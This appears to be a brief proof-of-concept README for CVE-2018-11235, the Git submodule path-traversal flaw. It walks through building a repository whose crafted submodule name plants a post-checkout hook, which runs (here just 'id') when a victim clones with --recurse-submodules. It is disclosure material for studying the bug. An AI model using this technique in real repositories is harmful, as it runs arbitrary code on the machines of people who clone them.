# CVE-2018-11235

Consult the [National Vulnerability Database (CVE-2018-11235)] for further information.

## Proof of Concept
```
$ mkdir /tmp/cve-2018-11235
$ cd /tmp/cve-2018-11235
$ git init module
$ cd module
$ > BLANK 
$ git add BLANK
$ git commit -m "This page intentionally left blank."
$ cd ..
$ git init repository
$ cd repository
$ git submodule add ../module module-corrupt
$ git submodule add ../module
$ cp -r .git/modules modules
$ cat > modules/module-corrupt/hooks/post-checkout
#!/bin/sh
id
$ chmod 755 modules/module-corrupt/hooks/post-checkout
$ cat > .gitmodules
[submodule "module"]
	path = module
	url = ../module
[submodule "../../modules/module-corrupt"]
	update = checkout
	path = module-corrupt
	url = ../module
$ git add .gitmodules modules
$ git commit -m "The End"
$ cd ..
$ git clone --recurse-submodules repository clone
Cloning into 'clone'...
done.
Submodule 'module' (/tmp/cve-2018-11235/module) registered for path 'module'
Submodule '../../modules/module-corrupt' (/tmp/cve-2018-11235/module) registered for path 'module-corrupt'
Cloning into 'module'...
done.
Submodule path 'module': checked out 'd621ae80237256c7906679a4fcb3484636263028'
uid=1000(user) gid=1000(user) groups=1000(user),6(disk),7(lp),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
Submodule path 'module-corrupt': checked out 'd621ae80237256c7906679a4fcb3484636263028'
```

[National Vulnerability Database (CVE-2018-11235)]: https://nvd.nist.gov/vuln/detail/CVE-2018-11235
